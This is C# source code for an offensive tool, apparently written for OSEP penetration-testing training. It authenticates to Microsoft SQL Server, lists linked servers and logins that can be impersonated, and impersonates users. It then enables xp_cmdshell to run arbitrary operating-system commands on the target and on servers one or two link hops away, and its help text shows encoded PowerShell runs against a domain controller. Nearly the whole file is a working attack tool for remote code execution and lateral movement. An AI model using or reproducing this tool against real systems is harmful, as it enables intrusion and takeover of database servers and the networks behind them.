// This tools allows us to perform some basic enumeration on SQL servers
// An execute commands on the backend OS as well
// We can supply user credentials or use the access token of the logged on user
// Credits to the OSEP course for the knowledge and understanding of the code
// and chvancooten ; his repo was super helpful https://github.com/Pal1Sec/OSEP-Code-Snippets/tree/main/MSSQL
// and was used as a template for this


using System;
using System.Data.SqlClient;


namespace SQLinkedcodeExec
{
    class Program
    {
        //function for executing sql queries
        public static String executeQuery(String query, SqlConnection con)
        {
            SqlCommand cmd = new SqlCommand(query, con);
            SqlDataReader reader = cmd.ExecuteReader();

            try
            {
                String result = "";
                while (reader.Read() == true)
                {
                    result += reader[0] + "\n";
                }
                reader.Close();
                return result;
            }

            catch
            {
                return "";
            }
        }

        public static void HelpMenu()
        {


            string asciiart = @"
________________________________________________________________________________________________________________
      __       __     _                                       __                         _____                  
    /    )   /    )   /      ,         /                /   /    )             /         /    '                 
----\-------/----/---/-----------__---/-__----__----__-/---/---------__----__-/----__---/__------|/----__----__-
     \     /  \ /   /      /   /   ) /(     /___) /   /   /        /   ) /   /   /___) /         |   /___) /   '
_(____/___(____X___/____/_/___/___/_/___\__(___ _(___/___(____/___(___/_(___/___(___ _/____ ____/|__(___ _(___ _
                \                                                                              /                
Enumerates MSSQL and executes code
   v1.0 by anans3                                                                                                             
";
            Console.WriteLine(asciiart);

            Console.WriteLine("[**] Help Menu!\n");
            
            Console.WriteLine("/codexec - executes specified code on MSSQL servers");
            Console.WriteLine("/impersonate - impersonates sa user on MSSQL server");
            Console.WriteLine("/localexec - enables code execution via xp_cmdshell on local MSSQL server");
            Console.WriteLine("/link1exec - enables code execution via xp_cmdshell on single hop linked MSSQL - Link 1");
            Console.WriteLine("/link2exec - enables code execution via xp_cmdshell on double hop linked MSSQL - Link 2");
            Console.WriteLine("/lnk - determines if the target MSSQL server has any linked servers");
            Console.WriteLine("/lnkedt - specifies the linked server connected to our target MSSQL - Link 1");
            Console.WriteLine("/lnkedtt - specifies the double linked server connect to our target MSSQL - Link 2");
            Console.WriteLine("/lnkedtcheck1 - enumerates linked server  - Link 1");
            Console.WriteLine("/lnkedtcheck2 - enumerates double linked server  - Link 1");
            Console.WriteLine("/pass - specifies password to use");
            Console.WriteLine("/t - specifies the target MSSQL server");
            Console.WriteLine("/syscreds - ignores the user specified and uses the token of the currently logged in user\n");
            Console.WriteLine("user - specifies the target user account");


            Console.WriteLine("Usage:");
            Console.WriteLine("SQLinkedCodeExec.exe /t <target> /user <username>  /pass <password>  <command-to-run>\n");

            Console.WriteLine("Usage: Examples:");
            Console.WriteLine("SQLinkedCodeExec.exe /?  - show's this help menu \n");

            Console.WriteLine("//Authenticate to target MSSQL with username and password");
            Console.WriteLine("SQLinkedCodeExec.exe /t <target name or IP> /user <username> /pass <password>\n");

            Console.WriteLine("//Authenticate to target MSSQL with current system token");
            Console.WriteLine("SQLinkedCodeExec.exe /t <target name or IP> /user <username> /pass <password> /syscreds true\n");

            Console.WriteLine("//Execute Code on target MSSQL server ");
            Console.WriteLine("SQLinkedCodeExec.exe /t <target name or IP> /user <username> /pass <password> /localexec true /codexec < Whatever - command - goes - here > \n");

            Console.WriteLine("//Check if target MSSQL server has any server links");
            Console.WriteLine("SQLinkedCodeExec.exe /t <target name or IP>  /syscreds true /lnk true\n");

            Console.WriteLine("//Execute Code on linked MSSQL server instance (appsrv01) - Link 1");
            Console.WriteLine("SQLinkedCodeExec.exe /t <target name or IP>  /syscreds true  /link1exec tTrue /lnkedt appsrv01 /codexec <powershell - enc...>\n");

            Console.WriteLine("//Impersonate sa account and execute Code on linked MSSQL server instance (appsrv01) - Link 1");
            Console.WriteLine("SQLinkedCodeExec.exe /t <target name or IP> /syscreds true /lnk true /impersonate true /codexec <powershell - enc>\n");

            Console.WriteLine("//Enumerate linked MSSQL server (appsrv01) for additional links to other instances - Link 1");
            Console.WriteLine("SQLinkedCodeExec.exe /t <target name or IP> /syscreds true /lnkedt appsrv01 /lnkedtcheck1 true\n");

            Console.WriteLine("//Checked double linked server (dc01) for the user we are operating as - Link 1");
            Console.WriteLine("SQLinkedCodeExec.exe /t <target name or IP> /syscreds true  /lnkedt appsrv01 /lnkedtt dc01 /lnkedtcheck2 true\n");

            Console.WriteLine("//Execute code on double linked server (dc01)");
            Console.WriteLine("SQLinkedCodeExec.exe /t dc01 /user someguy /pass somepass /syscreds true /lnk true  /link2exec true /lnkedt appsrv01 /lnkedtt dc01 /codexec <powershell - enc....>\n");

            return;
        }

        static void Main(string[] args)
        {

            if (args.Length < 2)
            {
                HelpMenu();
                return;
            }

            //This is our local server that we have access to
            String sqlServer = null;
            String database = "master";
            String UserName = null;
            String PassWord = null;
            String UseSysCreds = null;
            String Lnk = null;
            String LocalExec = null;
            String Link1Exec = null;
            String Link2Exec = null;
            String LnkdTarget = null;
            String LnkdTargett = null;
            String showHelp = null;
            String Cmd = null;
            String ImpersonateUser = null;
            String LinkedCheck1 = null;
            String LinkedCheck2 = null;
            String imp_db = null;
            String imp_user = null;


            for (int i = 0; i < args.Length; i++)
            {
                string parameterName;
                int colonIndex = args[i].IndexOf(':');
                if (colonIndex >= 0)
                    parameterName = args[i].Substring(0, colonIndex);
                else
                    parameterName = args[i];
                switch (parameterName.ToLower())
                {
                    case "/t":
                        if (colonIndex >= 0)
                        {
                            int valueStartIndex = colonIndex + 1;
                            sqlServer = args[i].Substring(valueStartIndex, args[i].Length - valueStartIndex);
                        }
                        else
                        {
                            i++;
                            if (i < args.Length)
                            {
                                sqlServer = args[i];
                            }
                            else
                            {
                                System.Console.WriteLine("Expected a target to be specified with the </t> parameter.");
                                return;
                            }
                        }
                        break;

                    case "/user":
                        if (colonIndex >= 0)
                        {
                            int valueStartIndex = colonIndex + 1;
                            UserName = args[i].Substring(valueStartIndex, args[i].Length - valueStartIndex);
                        }
                        else
                        {
                            i++;
                            if (i < args.Length)
                            {
                                UserName = args[i];
                            }
                            else
                            {
                                System.Console.WriteLine("Expected a user to be specified with the </user> parameter.");
                                return;
                            }
                        }
                        break;

                    case "/pass":
                        if (colonIndex >= 0)
                        {
                            int valueStartIndex = colonIndex + 1;
                            PassWord = args[i].Substring(valueStartIndex, args[i].Length - valueStartIndex);
                        }
                        else
                        {
                            i++;
                            if (i < args.Length)
                            {
                                PassWord = args[i];
                            }
                            else
                            {
                                System.Console.WriteLine("Expected a password to be specified with the </pass> parameter.");
                                return;
                            }
                        }
                        break;

                    case "/syscreds":
                        if (colonIndex >= 0)
                        {
                            int valueStartIndex = colonIndex + 1;
                            UseSysCreds = args[i].Substring(valueStartIndex, args[i].Length - valueStartIndex);
                        }
                        else
                        {
                            i++;
                            if (i < args.Length)
                            {
                                UseSysCreds = args[i];
                            }
                            else
                            {
                                System.Console.WriteLine("Expected option to use current user's access token with the </syscreds true> parameter.");
                                return;
                            }
                        }
                        break;

                    case "/lnk":
                        if (colonIndex >= 0)
                        {
                            int valueStartIndex = colonIndex + 1;
                            Lnk = args[i].Substring(valueStartIndex, args[i].Length - valueStartIndex);
                        }
                        else
                        {
                            i++;
                            if (i < args.Length)
                            {
                                Lnk = args[i];
                            }
                            else
                            {
                                System.Console.WriteLine("Expected an option to determine if target has any linked servers with the </lnk true> parameter.");
                                return;
                            }
                        }
                        break;

                    case "/localexec":
                        if (colonIndex >= 0)
                        {
                            int valueStartIndex = colonIndex + 1;
                            LocalExec = args[i].Substring(valueStartIndex, args[i].Length - valueStartIndex);
                        }
                        else
                        {
                            i++;
                            if (i < args.Length)
                            {
                                LocalExec = args[i];
                            }
                            else
                            {
                                System.Console.WriteLine("Expected option to execute commands on our target MSSQL server with the </localexec true> parameter.");
                                return;
                            }
                        }
                        break;

                    case "/link1exec":
                        if (colonIndex >= 0)
                        {
                            int valueStartIndex = colonIndex + 1;
                            Link1Exec = args[i].Substring(valueStartIndex, args[i].Length - valueStartIndex);
                        }
                        else
                        {
                            i++;
                            if (i < args.Length)
                            {
                                Link1Exec = args[i];
                            }
                            else
                            {
                                System.Console.WriteLine("Expected option to execute commands on Link 1 MSSQL server with the </link1exec true> parameter.");
                            }
                        }
                        break;

                    case "/link2exec":
                        if (colonIndex >= 0)
                        {
                            int valueStartIndex = colonIndex + 1;
                            Link2Exec = args[i].Substring(valueStartIndex, args[i].Length - valueStartIndex);
                        }
                        else
                        {
                            i++;
                            if (i < args.Length)
                            {
                                Link2Exec = args[i];
                            }
                            else
                            {
                                System.Console.WriteLine("Expected option to execute commands on Link 2 MSSQL server with the </link2exec true> parameter.");
                                return;
                            }
                        }
                        break;


                    case "/lnkedt":
                        if (colonIndex >= 0)
                        {
                            int valueStartIndex = colonIndex + 1;
                            LnkdTarget = args[i].Substring(valueStartIndex, args[i].Length - valueStartIndex);
                        }
                        else
                        {
                            i++;
                            if (i < args.Length)
                            {
                                LnkdTarget = args[i];
                            }
                            else
                            {
                                System.Console.WriteLine("Expected option to specify the first linked MSSQL server: Link 1 </lnkedt servername> parameter.");
                                return;
                            }
                        }
                        break;

                    case "/lnkedtt":
                        if (colonIndex >= 0)
                        {
                            int valueStartIndex = colonIndex + 1;
                            LnkdTargett = args[i].Substring(valueStartIndex, args[i].Length - valueStartIndex);
                        }
                        else
                        {
                            i++;
                            if (i < args.Length)
                            {
                                LnkdTargett = args[i];
                            }
                            else
                            {
                                System.Console.WriteLine("Expected option to specify the second linked MSSQL server: Link 2 with the </lnkedtt servername> parameter.");
                                return;
                            }
                        }
                        break;

                    case "/lnkedtcheck1":
                        if (colonIndex >= 0)
                        {
                            int valueStartIndex = colonIndex + 1;
                            LinkedCheck1 = args[i].Substring(valueStartIndex, args[i].Length - valueStartIndex);
                        }
                        else
                        {
                            i++;
                            if (i < args.Length)
                            {
                                LinkedCheck1 = args[i];
                            }
                            else
                            {
                                System.Console.WriteLine("Expected option to enumerate Link 1 linked MSSQL Server using the </lnkedtcheck1 true> parameter.");
                                return;
                            }
                        }
                        break;

                    case "/lnkedtcheck2":
                        if (colonIndex >= 0)
                        {
                            int valueStartIndex = colonIndex + 1;
                            LinkedCheck2 = args[i].Substring(valueStartIndex, args[i].Length - valueStartIndex);
                        }
                        else
                        {
                            i++;
                            if (i < args.Length)
                            {
                                LinkedCheck2 = args[i];
                            }
                            else
                            {
                                System.Console.WriteLine("Expected option to enumerate Link 2 linked MSSQL Server using the </lnkedtcheck2 true> parameter.");
                                return;
                            }
                        }
                        break;

                    case "/codexec":
                        if (colonIndex >= 0)
                        {
                            int valueStartIndex = colonIndex + 1;
                            Cmd = args[i].Substring(valueStartIndex, args[i].Length - valueStartIndex);
                        }
                        else
                        {
                            i++;
                            if (i < args.Length)
                            {
                                Cmd = args[i];
                            }
                            else
                            {
                                System.Console.WriteLine("Expected option to execute code on the target MSSQL server using the </codexec command> parameter.");
                                return;
                            }
                        }
                        break;

                    case "/impersonate":
                        if (colonIndex >= 0)
                        {
                            int valueStartIndex = colonIndex + 1;
                            ImpersonateUser = args[i].Substring(valueStartIndex, args[i].Length - valueStartIndex);
                        }
                        else
                        {
                            i++;
                            if (i < args.Length)
                            {
                                ImpersonateUser = args[i];
                            }
                            else
                            {
                                System.Console.WriteLine("Expected option to /impersonate the user on the specified MSSQL server using the </impersonate true> parameter.");
                            }
                        }
                        break;

                    case "/imp_db":
                        if (colonIndex >= 0)
                        {
                            int valueStartIndex = colonIndex + 1;
                            imp_db = args[i].Substring(valueStartIndex, args[i].Length - valueStartIndex);
                        }
                        else
                        {
                            i++;
                            if (i < args.Length)
                            {
                                imp_db = args[i];
                            }
                            else
                            {
                                System.Console.WriteLine("Expected option to database from which to impersonate with </imp_db > parameter.");
                            }
                        }
                        break;

                    case "/imp_user":
                        if (colonIndex >= 0)
                        {
                            int valueStartIndex = colonIndex + 1;
                            imp_user = args[i].Substring(valueStartIndex, args[i].Length - valueStartIndex);
                        }
                        else
                        {
                            i++;
                            if (i < args.Length)
                            {
                                imp_user = args[i];
                            }
                            else
                            {
                                System.Console.WriteLine("Expected option to user to impersonate with </imp_user > parameter.");
                            }
                        }
                        break;

                    case "-?":
                    case "/?":
                    case "-help":
                    case "/help":
                        showHelp = "true";

                        break;
                    default:
                        System.Console.WriteLine("Unrecognized parameter \"{0}\".", parameterName);
                        return;

                }
            }

            //Help Menu
            if (showHelp == "true")
            {
                HelpMenu();
                return;
            }


            //Constructing connection string
            String conString = $"Server ={sqlServer}; Database ={database}; User ={UserName}; Password ={PassWord}; Integrated Security ={UseSysCreds}";

            //Connect to Target SQL server with supplied creds/current user's token
            SqlConnection con = new SqlConnection(conString);

            //Check Authentication
            try
            {
                con.Open();
                Console.WriteLine("[*] Authentication successful!");

                //Checking which user we are operating locally as
                String res = executeQuery("SELECT SYSTEM_USER;", con);
                Console.WriteLine($"[*] Running locally on {sqlServer} as user: {res}");

                //Check users we can impersonate at login
                res = executeQuery("SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE'; ", con);
                Console.WriteLine($"[*] The user can impersonate the following logins: {res}.");

                
            }
            catch
            {
                Console.WriteLine("Authentication failed");
                Environment.Exit(0);

            }

            //Execute commands as the impersonated user
            //SQLinkedCodeExec /t dc01 /user someguy /pass somepass /syscreds True /lnk True /impersonate True /codexec "powershell -enc"
            if (ImpersonateUser == "true")
            {
                String res = executeQuery($"use {imp_db}; EXECUTE AS USER = '{imp_user}';", con);
                Console.WriteLine($"[*] Impersonation started: Executing as " + res);
                res = executeQuery("EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;", con);
                Console.WriteLine("[*] Enabled 'xp_cmdshell'.");
                res = executeQuery($"EXEC xp_cmdshell '{Cmd}'", con);
                Console.WriteLine($"[*] Executed command! Result: {res}");
            }

                if (Lnk == "true")
            {
                try
                {
                    //Looking for linked servers
                    String res = executeQuery("EXEC sp_linkedservers;", con);
                    Console.WriteLine($"[*] Found linked servers: {res}");

                    //Check what user we are operating as on Remote Linked Server
                    //res = executeQuery("select mylogin from openquery(\"SQL03\", 'select SYSTEM_USER as mylogin');", con);
                    res = executeQuery("select mylogin from openquery(\""+LnkdTarget+"\", 'select SYSTEM_USER as mylogin');", con);
                    Console.WriteLine($"[*] Executing on Remote server : {LnkdTarget}  as: {res}");
                }
                catch
                {
                    con.Close();
                    return;
                }

            }



            // Execute on local MSSQL server 
            if (LocalExec == "true")
            {

                //Enables xp_cmdshell on remote target linked instance - link 1
                String res = executeQuery("EXEC ('sp_configure ''show advanced options'', 1; reconfigure;')", con);
                Console.WriteLine($"[*] Enabled advanced options on {sqlServer}.");
                res = executeQuery("EXEC ('sp_configure ''xp_cmdshell'', 1; reconfigure;')", con);
                Console.WriteLine($"[*] Enabled xp_cmdshell option on {sqlServer}.");

                //Executes supplied code on remote target - you can make this a variable for flexibility
                Console.WriteLine($"[*] Executing code on {sqlServer}.");
                res = executeQuery("EXEC ('xp_cmdshell ''" + Cmd + "'';')", con);

                Console.WriteLine($"[*] Code Execution complete. All the best!");
                con.Close();
            }

            // Execute on remote linked server 
            if (Link1Exec == "true")
            {

                //Enables xp_cmdshell on remote target linked instance - link 1
                String res = executeQuery("EXEC ('sp_configure ''show advanced options'', 1; reconfigure;') AT " + LnkdTarget + ";", con);
                Console.WriteLine($"[*] Enabled advanced options on {LnkdTarget}.");
                res = executeQuery("EXEC ('sp_configure ''xp_cmdshell'', 1; reconfigure;') AT " + LnkdTarget + ";", con);
                Console.WriteLine($"[*] Enabled xp_cmdshell option on {LnkdTarget}.");

                //Executes supplied code on remote target - you can make this a variable for flexibility
                Console.WriteLine($"[*] Executing code on {LnkdTarget}.");
                res = executeQuery("EXEC ('xp_cmdshell ''"+Cmd+"'';') AT " + LnkdTarget + ";", con);

                Console.WriteLine($"[*] Code Execution complete. All the best!");
                con.Close();
            }


            if (LinkedCheck1 == "true"){

                //Check for linkedservers from Remote linked server 
                String res = executeQuery("EXEC ('sp_linkedservers;') AT " + LnkdTarget + ";", con);
                Console.WriteLine($"[*] Enumerating {LnkdTarget} and found linked server(s) : {res}");

                //Check who we are running as on Remote Linked system
                String su = executeQuery("select mylogin from openquery(\"" + LnkdTarget + "\", 'select SYSTEM_USER as mylogin');", con);
                Console.WriteLine($"[*] system user on remote linked system is '{su}' in database {LnkdTarget} via 1 link.");
            }

            if (LinkedCheck2 == "true")
            {
                //Check what user we are operating as on Double Remote Linked Server
                String su = executeQuery("select mylogin from openquery(\"" + LnkdTarget + "\", 'select mylogin from openquery(\"" + LnkdTargett + "\", ''select SYSTEM_USER as mylogin'')');", con);
                Console.WriteLine($"[*] system user on double remote linked system is '{su}' in database {LnkdTargett} via 2 link.");
                con.Close();
            }


            // Execute code on double remote linked server 
            if (Link2Exec == "true")
            {
                String enableadvoptions = $"EXEC ('EXEC (''sp_configure ''''show advanced options'''', 1; reconfigure;'') AT {LnkdTargett}') AT  {LnkdTarget}";
                String enablexpcmd = $"EXEC ('EXEC (''sp_configure ''''xp_cmdshell'''', 1; reconfigure;'') AT {LnkdTargett} ') AT {LnkdTarget}";
                //String execCmd = $"EXEC ('EXEC (''xp_cmdshell ''''" + Cmd + "'''';'') AT ' {LnkdTargett}') AT {LnkdTarget}";
                String execCmd = $"EXEC ('EXEC (''xp_cmdshell ''''{Cmd}'''';'') AT {LnkdTargett}') AT {LnkdTarget}";



                SqlCommand command = new SqlCommand(enableadvoptions, con);
                SqlDataReader reader = command.ExecuteReader();
                Console.WriteLine($"[*] Enabled advanced options on {LnkdTargett}.");
                reader.Close();

                command = new SqlCommand(enablexpcmd, con);
                reader = command.ExecuteReader();
                Console.WriteLine($"[*] Enabled xp_cmdshell option on {LnkdTargett}.");
                reader.Close();

                Console.WriteLine($"[*] Code Execution...code on {LnkdTargett} !");
                command = new SqlCommand(execCmd, con);
                reader = command.ExecuteReader();
                Console.WriteLine($"[*] Code Execution complete. All the best!");
                reader.Read();
                reader.Close();
                con.Close();

            }
        }
    }
}